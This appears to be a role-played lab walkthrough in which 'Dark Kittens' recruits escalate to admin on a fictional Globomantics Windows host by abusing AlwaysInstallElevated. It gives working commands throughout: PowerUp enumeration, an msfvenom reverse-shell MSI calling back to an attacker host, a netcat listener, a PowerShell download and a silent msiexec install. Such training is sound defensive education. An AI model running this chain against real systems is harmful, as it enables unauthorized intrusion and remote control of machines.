# Introduction

**Welcome!**

Welcome to the war effort fellow Dark Kitten. Globomantics "ideal society" is getting more support across the globe. They are using their evil social media machine to recruit more 'sheeple'! It is our job to take them down!

Our initial access team have managed to compromise *Maxwell "Max" Overdrive*, the Chief Visionary Officer at Globomantics.

This account is a member of the *Remote Desktop Users* local group on the host *172.31.24.20*. Your task is to elevate the privileges of *max.overdrive* and gain local administrative rights on the target. Once this is completed our hacking projects team will decide on our next move. Do not fail us!

**Your task**

You will:

1. Use the compromised account to access the target and enumerate your existing privileges.
2. Use **PowerUp** to enumerate privilege escalation opportunities.
3. Deploy a malicious reverse shell to exploit the target as a privileged user.

As a new recruit we will guide you every step of the way.

Good luck!

# Remote Access

In this challenge you will connect to the target host using **RDP** and enumerate the privileges of the *max.overdrive* account. Let's go:

1. When it's available, click the Open environment button to the right. It'll take about one to three minutes to become available. This will open a **Kali** host for you to carry out your attack.
2. Once on the **Kali** host, open a new terminal window. This can be found in the top right (**Terminal Emulator**).
3. From the terminal prompt, enter the following: `xfreerdp /u:max.overdrive /p:P@ssword123 /v:172.31.24.20`.
   1. The `/u` parameter is used to specify the *username*.
   2. The `/p` parameter is used to specify the user's *password*.
   3. The `/v` parameter is used to specify the *target* host.
4. When you connect you will be prompted to 'trust the above certificate'. Enter `Y`.

You will be presented with an **RDP** session to *172.31.24.20*. In the **RDP** session:

1. Double-click the **PowerShell 7** icon on the Windows desktop.
2. From the **PowerShell** prompt, enter `whoami /groups`.
3. Spend some time analysing which groups you are a member of.
   1. Notice that you are a member of the *BUILTIN\Remote Desktop Users* group.
   2. Notice that you have an integrity level of *Mandatory Label\Medium Level*.

The *Medium* integrity level is the default integrity level for accounts in Windows and is restricted in the privileges it has. Ideally you want to escalate our privileges to the *System* integrity level.

1. From the **PowerShell** prompt, enter `whoami /priv`.
2. Notice that your current privilege levels are severely restricted.

In this challenge, you successfully connected to the target host using a compromised account and enumerated the privilege level of the compromised account.

# Enumeration

In this challenge you will continue your enumeration of the target host and enumerate any privilege escalation opportunities that may exist. You've got this!

For your convenience the **PowerUp.ps1** script has been uploaded to the *C:\Tools\* folder:

1. Enter `cd C:\Tools\` from the **PowerShell** prompt.
2. Enter `dir` and confirm that the **PowerUp.ps1** script is present.
3. Import the **PowerUp** module by entering `Import-Module .\PowerUp.ps1`:
   1. You will receive a warning message, this can safely be ignored.
4. Run the **PowerUp** module to check for common privilege escalation vulnerabilities: `Invoke-AllChecks 2>$null`.

Notice that all errors (*stderr* or *2*) are being piped to *$null*. **PowerUp** was originally written for **PowerShell version 2** and may generate som errors in **PowerShell 7**.

When the script has completed running, you should notice the following output:

<img width="1477" alt="Screenshot 2025-06-03 at 13 19 12" src="https://github.com/user-attachments/assets/25c21acf-1501-4009-abce-579afd46a0a7" />

This is excellent news! There is an opportunity for you to escalate your privileges. You can take a look at why this vulnerability exists:

1. From the **PowerShell** prompt, enter `Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"`.
2. Now enter `Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"`.
3. Observe the output, as shown below:

<img width="1426" alt="Screenshot 2025-06-03 at 13 19 50" src="https://github.com/user-attachments/assets/1dab2de8-d398-47c3-acdf-6c1667df9f7f" />

To exploit this vulnerability the *AlwaysInstallElevated* registry key must equal *1* in the *HKEY_LOCAL_MACHINE* and the *HKEY_CURRENT_USER* hives. This condition has been met, nice!

In this challenge, you successfully enumerated privilege escalation opportunities on the target host. You discovered that the *AlwaysInstallElevated* registry keys can be abused.

# Privilege Escalation

In this challenge you will exploit the privilege escalation vulnerability that you discovered. You will deploy a malicious *.msi* binary and run it to gain a privileged reverse shell back to your *Kali* host.

First you will generate a malicious binary using *msfvenom*:

1. On your *Kali* host open a new terminal from the menu: **File > New Tab**. Or press **Ctrl+Shift+T**.
2. At the new terminal prompt, enter: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.31.24.100 LPORT=443 -a x64 --platform windows -f msi -o dark_kitten.msi`.
   1. The `-p` parameter is used to specify the type of payload (*windows/x64/shell_reverse_tcp*).
   2. The `LHOST=` parameter is used to specify the host listening for the reverse shell (this is your Kali host).
   3. The `LPORT=` parameter is the local port listening for the reverse shell.
   4. The `-a` parameter specifies the CPU architecture.
   5. The `--platform` parameter specifies the target OS platform.
   6. The `-f` parameter specifies the format of the binary.
   7. Finally, the `-o` specifies an output file to write the malicious binary to.

Provided there are no errors, you should have a malicious binary file ready to deploy on the target. Use the `ls -la` command to confirm the file was generated correctly.

Next, you will run a basic web server to host the file. You will use **PowerShell** to connect to it and download the binary to the target host:

1. From the same terminal prompt, enter: `php -S 0.0.0.0:80`.

You will now start a *netcat* listener on your *Kali* host:

1. Open a new terminal from the menu: **File > New Tab**. Or press **Ctrl+Shift+T**.
2. Enter the following in the new terminal: `nc -nvlp 443`.
   1. The `-n` parameter means do not resolve DNS names.
   2. The `-v` parameter puts *netcat* in verbose mode.
   3. The `-l` paremeter puts *netcat* in listening mode.
   4. The `-p` parameter specifies the port to listen on (*443*).

Return to the Window host in the **RDP** session. It's time to execute your privilege escaloation exploit:. First, you will use the *Invoke-WebRequest* cmdlet to download the binary file:

1. In the **PowerShell** session, enter `iwr -uri "http://172.31.24.100/dark_kitten.msi" -outfile ".\dark_kitten.msi"`.
   1. The `-uri` parameter specifies the file to download.
   2. The `-outfile` parameter specifies where you want to save the file.
2. Confirm that the file has downloaded using the `dir` command.

If all has gone well, you are ready to escalate your pivieleges.

1. From the **PowerShell** prompt, enter `msiexec /i C:\Tools\dark_kitten.msi /qn`.
   1. The `/i` parameter installs the specified file.
   2. The `/qn` parameter sets the interface level to *No UI*.
2. Return to your *netcat* listener on the *Kali* host, you should have a reverse shell.
3. Enter `whoami` in the reverse shell to confirm you have escalated your privileges.

In this challenge, you successfully escalated your privileges on the target host using the AlwaysInstallElevated registry key exploit.

You have proved useful to us, great job!

*Chairman Meow, Supreme Leader of the Dark Kittens.*
